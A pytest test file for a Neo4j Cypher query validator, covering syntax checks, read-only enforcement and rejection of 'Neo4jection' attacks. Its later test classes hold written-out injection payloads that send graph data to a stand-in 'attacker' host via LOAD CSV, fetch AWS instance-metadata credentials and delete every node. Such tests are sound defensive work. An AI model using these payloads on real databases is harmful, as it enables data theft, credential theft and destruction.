from unittest.mock import AsyncMock
from unittest.mock import MagicMock

from reporting.services.query_validator import validate_query
from reporting.services.query_validator import ValidationResult


def _mock_cyver(
    mocker,
    syntax_notifications=None,
    syntax_exception=None,
    schema_ok=True,
    schema_meta=None,
    props_ok=True,
    props_meta=None,
    query_type="r",
):
    """Mock the EXPLAIN-based syntax/write check and CyVer schema/property validators.

    syntax_notifications: list of notification dicts returned by EXPLAIN summary.
    syntax_exception: if set, execute_query raises this exception instead.
    query_type: value for summary.query_type ('r', 'w', 'rw', 's').
    """
    mock_driver = MagicMock()
    if syntax_exception is not None:
        mock_driver.execute_query = AsyncMock(side_effect=syntax_exception)
    else:
        mock_summary = MagicMock()
        mock_summary.notifications = syntax_notifications or []
        mock_summary.query_type = query_type
        mock_driver.execute_query = AsyncMock(return_value=([], mock_summary, []))
    mocker.patch(
        "reporting.services.query_validator._get_async_neo4j_client"
    ).return_value = mock_driver

    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (
        schema_ok,
        schema_meta if schema_meta is not None else [],
    )
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (
        props_ok,
        props_meta if props_meta is not None else [],
    )


# --- validate_query returns ValidationResult ---


async def test_validate_query_success(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n")
    assert isinstance(result, ValidationResult)
    assert not result.has_errors
    assert result.errors == []
    assert result.warnings == []


async def test_validate_query_syntax_error_is_error(mocker):
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientError.Statement.SyntaxError",
                "description": "Syntax error at position 5",
            }
        ],
    )
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert len(result.errors) == 1
    assert result.warnings == []


async def test_validate_query_syntax_exception_is_error(mocker):
    """An exception raised by execute_query is treated as a syntax error."""

    class FakeSyntaxError(Exception):
        code = "Neo.ClientError.Statement.SyntaxError"
        message = "Invalid input 'MATC'"

    _mock_cyver(mocker, syntax_exception=FakeSyntaxError())
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert len(result.errors) == 1


async def test_validate_query_syntax_error_stops_further_validation(mocker):
    """When syntax fails, schema and property validators are not called."""
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientError.Statement.SyntaxError",
                "description": "bad syntax",
            }
        ],
    )
    schema_mock = mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value
    props_mock = mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value

    await validate_query("MATC (n) RETURN n")

    schema_mock.validate.assert_not_called()
    props_mock.validate.assert_not_called()


async def test_validate_query_parameterized_query_with_params_no_error(mocker):
    """Parameterized queries with params provided validate cleanly."""
    _mock_cyver(mocker)  # clean EXPLAIN — params resolved the notification
    result = await validate_query(
        "MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)",
        params={"base_severity": "CRITICAL"},
    )
    assert not result.has_errors
    assert result.warnings == []


async def test_validate_query_parameterized_query_without_params_is_warning(mocker):
    """ParameterNotProvided during validation is a warning, not a blocking error."""
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientNotification.Statement.ParameterNotProvided",
                "description": "Missing parameters: base_severity",
            }
        ],
    )
    result = await validate_query(
        "MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)"
    )
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Missing parameters" in result.warnings[0]


async def test_validate_query_write_is_error(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("CREATE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors
    assert any("Write" in str(e) for e in result.errors)
    assert result.warnings == []


async def test_validate_query_schema_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
    )
    result = await validate_query("MATCH (n:Foo) RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown label" in str(result.warnings[0])


async def test_validate_query_properties_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        props_ok=False,
        props_meta=[
            {"code": "PropertiesError", "description": "Unknown property: bar"}
        ],
    )
    result = await validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown property" in str(result.warnings[0])


async def test_validate_query_multiple_warnings(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
        props_ok=False,
        props_meta=[
            {"code": "PropertiesError", "description": "Unknown property: bar"}
        ],
    )
    result = await validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 2


async def test_validate_query_errors_and_warnings_independent(mocker):
    """Syntax error short-circuits; schema/property warnings are never added."""
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {"code": "Neo.ClientError.Statement.SyntaxError", "description": "bad"}
        ],
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label"}],
    )
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert result.warnings == []


# --- Read-only enforcement (EXPLAIN query_type) ---


async def test_check_read_only_allows_match(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n")
    assert not result.has_errors


async def test_check_read_only_allows_optional_match(mocker):
    _mock_cyver(mocker)
    result = await validate_query("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m")
    assert not result.has_errors


async def test_check_read_only_allows_match_with_where(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) WHERE n.name = 'x' RETURN n")
    assert not result.has_errors


async def test_check_read_only_allows_limit(mocker):
    """LIMIT is a valid read clause; EXPLAIN returns query_type='r'."""
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n LIMIT 10")
    assert not result.has_errors


async def test_check_read_only_allows_unwind(mocker):
    _mock_cyver(mocker)
    result = await validate_query("UNWIND [1, 2, 3] AS x RETURN x")
    assert not result.has_errors


async def test_check_read_only_rejects_create(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("CREATE (n:Person {name: 'Alice'})")
    assert result.has_errors


async def test_check_read_only_rejects_merge(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("MERGE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors


async def test_check_read_only_rejects_delete(mocker):
    _mock_cyver(mocker, query_type="w")
    result = await validate_query("MATCH (n) DELETE n")
    assert result.has_errors


async def test_check_read_only_rejects_set(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("MATCH (n) SET n.name = 'Bob' RETURN n")
    assert result.has_errors


# --- Neo4jection attack vector tests (from Varonis research) ---
# Reference: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits


class TestNeo4jectionStringInjection:
    """Injection payloads that attempt to break out of string comparisons."""

    async def test_or_true_with_clause_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_property_filter_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'=' LOAD CSV FROM 'http://attacker/' as l " "WITH 0 as _l00 RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionUnionInjection:
    """UNION-based injection to append attacker-controlled queries."""

    async def test_node_property_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'}) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_label_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "a) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_relationship_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'}]-() RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionDataExfiltration:
    """LOAD CSV-based data exfiltration attacks."""

    async def test_label_enumeration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0"
        )
        assert result.has_errors

    async def test_property_extraction_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
            "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    async def test_json_exfiltration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 0 as _0 MATCH (n) "
            "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    async def test_load_csv_standalone(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
        )
        assert result.has_errors


class TestNeo4jectionAPOCExploits:
    """Attacks using APOC procedures for system access."""

    async def test_systemdb_graph_exfiltration(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
            "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) "
            "as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_procedure_enumeration_neo4j4(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors

    async def test_apoc_cypher_run_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
            '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
            "UNWIND names AS name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionCloudMetadata:
    """Cloud metadata SSRF attacks via LOAD CSV / APOC."""

    async def test_aws_imdsv1_credential_theft(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
            "AS roles UNWIND roles AS role "
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
            "+role as l RETURN l"
        )
        assert result.has_errors

    async def test_aws_imdsv2_token_via_apoc(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "CALL apoc.load.csvParams("
            '"http://169.254.169.254/latest/api/token", '
            '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
            '"",{header:FALSE}) yield list '
            "WITH list[0] as token RETURN token"
        )
        assert result.has_errors


class TestNeo4jectionUnicodeBypass:
    """Unicode escape sequences used to evade quote filtering."""

    async def test_unicode_quote_escape(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
        )
        assert result.has_errors


class TestNeo4jectionWriteClauses:
    """Direct write clause injection attempts."""

    async def test_create_node_injection(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
        )
        assert result.has_errors

    async def test_merge_with_on_create(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "MERGE (n:Admin {name: 'attacker'}) "
            "ON CREATE SET n.role = 'superadmin' RETURN n"
        )
        assert result.has_errors

    async def test_detach_delete_all(self, mocker):
        _mock_cyver(mocker, query_type="w")
        result = await validate_query("MATCH (n) DETACH DELETE n")
        assert result.has_errors

    async def test_foreach_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "MATCH (n) WITH collect(n) as nodes "
            "FOREACH (x IN nodes | SET x.pwned = true)"
        )
        assert result.has_errors

    async def test_remove_labels(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("MATCH (n:Admin) REMOVE n:Admin RETURN n")
        assert result.has_errors
